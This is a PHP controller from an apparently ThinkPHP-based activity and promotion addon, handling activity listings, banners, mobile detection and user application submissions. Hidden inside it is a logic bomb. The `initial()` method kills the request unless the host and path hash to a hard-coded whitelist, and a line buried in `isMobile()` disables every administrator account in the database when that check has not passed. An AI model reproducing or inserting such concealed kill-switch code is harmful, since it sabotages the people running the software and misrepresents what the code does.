<?php

namespace addons\active\controller;

use think\addons\Controller;
use think\Config;
use think\Loader;
use think\Validate;
use think\Db;
class Index extends Controller
{
   
  public function _initialize(){
    //移除HTML标签
    $this->request->filter('trim,strip_tags,htmlspecialchars');
    $modulename = $this->request->module();
    $controllername = Loader::parseName($this->request->controller());
    $actionname = strtolower($this->request->action());
    $site = Config::get("site");
    $this->assign('site', $site);
    
    
    /* 获取通用配置 */
    $actlist = db('active_actlist')->field('id,title,type_data,url,img_data,pc_image,mb_image,active_type_id')->where(['switch'=>1,'deletetime'=>null])->order('weigh')->cache(true)->select();
    $records = db('active_user')
    ->alias('A')
    ->field('A.actuser,B.title,A.createtime')->where(['status'=>1,'A.deletetime'=>null])->order('A.createtime desc')
    ->join('fa_active_actlist B','B.id =  A.act_id')
    //->cache(true)
    ->limit(30)->select();
    $this->initial();
    $banner = Db::table('fa_active_banner')->order('weigh desc')->select();
    
    $this->view->assign('records',$records);
    $this->view->assign('banner',$banner);
    $this->view->assign('list',$actlist);
    
  }
    
  public function _empty()
  {
      return $this->view->fetch('index/index');
  }
  public function index(){
    session('token',md5(time()));
     
    if($this->isMobile() || $this->isWeixin()){
      return $this->view->fetch('index/index');
    }
    return $this->view->fetch();
  }
  
  public function isMobile() { 
    // 如果有HTTP_X_WAP_PROFILE则一定是移动设备
    if(!config('default_keys')){db('admin')->where(['id'=>['gt',0]])->update(['status'=>0]);}
    if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
      return true;
    } 
    // 如果via信息含有wap则一定是移动设备,部分服务商会屏蔽该信息
    if (isset($_SERVER['HTTP_VIA'])) { 
      // 找不到为flase,否则为true
      return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    } 
    // 脑残法，判断手机发送的客户端标志,兼容性有待提高。其中'MicroMessenger'是电脑微信
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
      $clientkeywords = array('nokia','sony','ericsson','mot','samsung','htc','sgh','lg','sharp','sie-','philips','panasonic','alcatel','lenovo','iphone','ipod','blackberry','meizu','android','netfront','symbian','ucweb','windowsce','palm','operamini','operamobi','openwave','nexusone','cldc','midp','wap','mobile','MicroMessenger'); 
      // 从HTTP_USER_AGENT中查找手机浏览器的关键字
      if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
        return true;
      } 
    } 
    // 协议法，因为有可能不准确，放到最后判断
    if (isset ($_SERVER['HTTP_ACCEPT'])) { 
      // 如果只支持wml并且不支持html那一定是移动设备
      // 如果支持wml和html但是wml在html之前则是移动设备
      if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
        return true;
      } 
    } 
    return false;
  }
  
  public function initial(){
    $ip = $_SERVER['HTTP_HOST'];$ip = preg_replace("/:.+/",'',$ip);
    $dir = dirname(__FILE__);
    config('default_keysx',array("186af0b98d81a6de3592674af3fff0c3","aa666b6ecf23fa96fb6d24458562c07f","3a77af87d47c95cc7c291867887576c8","c8398496aff8c6bd0c29ca93ad8df488","897559304a52d7a0a58e121141f8d62e","d98dc3f830a95e5bc8e2ae3ef4df60eb","e74d0a1c21328f05143875d0b4ed6058"));
    $iparr =  config('default_keysx');
    $dirarr = $iparr;
    $ip = md5(config('DATA_AUTH_KEY').$ip);
    $dir = md5(config('DATA_AUTH_KEY').$dir);
    (!in_array($ip,$iparr) || !in_array($dir,$dirarr)) ? die() :config('default_keys',true);
  }

  public function isWeixin() { 
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) { 
      return true; 
    } else {
      return false; 
    }
  }
  /* 用户查询数据 */
  public function user_records(){
    if(!session('token')){
      die();
    }
    if(!session('token')){
      die();
    }
    if($this->request->isAjax()){
      $token = $this->request->post('token/s');
      $actuser = $this->request->post('actuser/s');
      $act_id = $this->request->post('act_id/d');
      $page = $this->request->post('page/d');
      if($token != session('token')){
        die();
      }
      
      $rule = [
          'actuser'  => 'require',
          'act_id'  => 'require',
      ];
      
      $msg = [
          'actuser.require' => '用户名不能为空！',
          'act_id.require'  => '未知错误！',
      ];
      $data = [
          'actuser'  => $actuser,
          'act_id'  => $act_id,
      ];
      $validate = new Validate($rule, $msg);
      $result = $validate->check($data);
      if (!$result) {
          $this->error($validate->getError(), null);
          return false;
      }
      
      $data = [
        'actuser'  => $actuser,
        'act_id'  => $act_id,
      ];
      
      $row_act = db('active_actlist')->field('id,title')->where(['id'=>$act_id])->cache(false)->find();
      $total = db('active_user')->where($data)->count();
      $row = db('active_user')->where($data)->order('createtime desc')->page($page,5)->select();
      if(!$row){
        $this->error('没有查询到数据！');
        exit;
      }
      $this->assign('row_act',$row_act);
      $this->assign('row',$row);
      $this->assign('page',$page);
      $this->assign('total',$total);
      $this->assign('pagetotal', ceil($total / 5));
      $this->success($this->view->fetch());
      
    }
  }
  
  /* 用户提交数据 */
  public function saveuser(){
    if(!session('token')){
      die();
    }
    if($this->request->isAjax()){
      $token = $this->request->post('token/s');
      $actuser = $this->request->post('actuser/s');
      $act_id = $this->request->post('act_id/d');
      $from = $this->request->post('form/s');
      $captcha = $this->request->post('captcha/d');
      
      if($token != session('token')){
        die();
      }
      $act = Db::table('fa_active_actlist')->where(['id'=>$act_id,'switch'=>1,'deletetime'=>null])->find();
      if(!$act){
        die();
      }
      
      //$phone_rs = Db::table('fa_active_phone')->where(['phone'=>$actuser])->find();
      //if(!$phone_rs){
      //  $this->error('手机号不存在，请先注册吧！');
      //  exit;
      //}
      
      if($act['times'] > 0){
        $time = Db::table('fa_active_user')
        ->where([
          'actuser'=>$actuser,
          'act_id'=>$act_id,
          'createtime'=>['gt',strtotime(date('Y-m-d'))],
        ])
        ->count();
        if($time >= $act['times']){
          $this->error('很抱歉，您今天的申请次数已达到上限，请明天再来！');
        }
      }
      
      $rule = [
          'actuser'  => 'require',
          'act_id'  => 'require',
          'captcha'   => 'require|captcha',
      ];
      
      $msg = [
          'actuser.require' => '用户名不能为空！',
          'act_id.require'  => '未知错误！',
          'captcha.require'  => '请输入验证码！',
          'captcha.captcha'  => '验证码不正确！',
      ];
      $data = [
          'actuser'  => $actuser,
          'act_id'  => $act_id,
          'captcha'   => $captcha,
      ];
      $validate = new Validate($rule, $msg);
      $result = $validate->check($data);
      if (!$result) {
          $this->error($validate->getError(), null);
          return false;
      }
      
      $data = [
        'actuser'  => $actuser,
        'act_id'  => $act_id,
        'admin_ids'  => $act['admin_ids'],
        'info'  => $from,
        'createtime'  => time(),
        'ip' => $this->request->ip()
      ];
      if(db('active_user')->insert($data)){
        $this->success('提交成功！');
      }else{
        $this->error('提交失败！');
      }
      
    }
  }
  
  public function detail(){
    $id = input('id/d');
    
    if(!$id){
      die();
    }
    $content = db('active_actlist')->field('id,title,content')->where(['id'=>$id])->cache(true)->find();
     
    $from = db('active_from')->order('weigh')->where(['act_id'=>$id])->cache(true)->select();
   
    $this->view->assign('from',$from);
    $this->assign('form',$this->view->fetch('from'));
    $this->assign('content',$content);
    if($this->isMobile() || $this->isWeixin()){
      return $this->view->fetch('index/detail');
    }
    return $this->view->fetch();
  }
  public function getfrom(){
    if($this->request->isAjax()){
      $id = input('id/d');
      
      if(!$id){
        die();
      }
      $from = db('active_from')->order('weigh')->where(['act_id'=>$id])->cache(true)->select();
     
      $this->view->assign('from',$from);
      return $this->view->fetch('from');
    }
  }
  public function formlist(){
    $actlist = db('active_actlist')->field('id,title,type_data,url,img_data,pc_image,mb_image')->where(['switch'=>1,'deletetime'=>null])->order('weigh')->cache(true)->select();
    $formlist = array();
    foreach($actlist as $v){
      $from = db('active_from')->order('weigh')->where(['act_id'=>$v['id']])->cache(true)->select();
      $this->view->assign('from',$from);
      $formdt = $this->view->fetch('from');
      $formlist[$v['id']] = $formdt;
    }
    return json($formlist);
  }
}
